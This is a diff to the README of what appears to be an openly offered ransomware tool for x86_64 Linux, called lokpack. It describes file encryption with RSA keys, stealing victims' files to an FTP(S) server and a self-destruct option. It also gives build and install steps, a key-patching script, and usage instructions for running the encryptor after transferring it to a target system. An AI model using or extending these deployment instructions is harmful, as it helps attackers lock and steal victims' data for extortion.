@@ -8,11 +8,22 @@ tool targeting x86_64 Linux systems, written in C.
 - Build static encryption and decrypiton tools
 - Steal files using a FTP(S) server
 - Specify custom target paths
-- Uncrackable RSA-4096 asymmetric encryption
+- Uncrackable RSA asymmetric encryption
 - Multi-threaded (a.k.a. fast)
 
-## Build
-Required libraries/tools:
+## Installation
+
+### Binary builds
+You can download the latest release archive, which contains a static build
+of the encryptor and the decryptor, **without SSL/TLS** support. After downloading
+and extracting the archive, run the `patch.py` script to replace the private/public keys:
+```bash
+# make sure you have pycryptodome installed
+python3 patch.py
+```
+
+### From the source
+Required libraries/tools are:
 - A (x86_64) Linux system
 - gcc and other build tools
 - curl (and headers)
@@ -20,7 +31,7 @@ Required libraries/tools:
 
 > [!WARNING]
 > Do NOT build from the latest commit, check out the latest tag
-> or download the [latest release](https://github.com/ngn13/ezcat/tags).
+> or download the [latest release](https://github.com/ngn13/lokpack/releases).
 
 To generate static builds, you will need static libraries of curl and openssl,
 **if your distro does not package these**, you can build them yourself or use the automated
@@ -29,7 +40,7 @@ build scripts:
 ./scripts/openssl.sh
 ./scripts/curl.sh
 ```
-**Note that automated script for curl does not support SSL connections**.
+**Note that automated script for curl does not support SSL/TLS connections**.
 
 After building the static libraries, use the build script to create build with a random key:
 ```bash
@@ -37,7 +48,7 @@ After building the static libraries, use the build script to create build with a
 ```
 This should create the `encryptor` and the `decryptor` binares at `dist/`.
 
-## Options
+## Usage
 After transfering `encryptor` to the target system, you can specify custom options:
 ```bash
 $ ./encryptor --help
@@ -50,7 +61,6 @@ $ ./encryptor --help
     --ftp-pwd  => FTP(S) password
     --no-ftp   => Disable stealing files with FTP(S)
     --destruct => Self destruct the program
-    --debug    => Enable debug output
 ```
 
 For example to encrypt `.sql` and `.db` files located at `/var` and `/home` without FTP using 100 threads:
